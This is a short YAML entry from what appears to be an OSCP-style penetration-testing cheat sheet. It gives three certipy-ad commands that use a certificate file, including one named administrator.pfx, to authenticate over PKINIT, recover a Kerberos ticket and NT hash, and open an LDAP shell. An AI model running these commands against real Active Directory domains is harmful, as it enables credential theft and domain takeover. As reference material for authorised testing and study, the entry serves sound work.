---
variants:
  - label: pfx
    command: |
      certipy-ad auth -pfx administrator.pfx -dc-ip $DCIP
  - label: pfx-user
    command: |
      certipy-ad auth -pfx user.pfx -username $USER -domain $DOMAIN -dc-ip $DCIP
  - label: ldap-shell
    command: |
      certipy-ad auth -pfx user.pfx -dc-ip $DCIP -ldap-shell
description: Authenticate with a certificate via PKINIT to recover a Kerberos TGT and the account NT hash
os: [Linux]
category: [oscp, cli]
service: [ADCS, Kerberos]
phase: [CredAccess, Exploitation]
references:
  - https://www.kali.org/tools/certipy-ad/
  - https://github.com/ly4k/Certipy
---
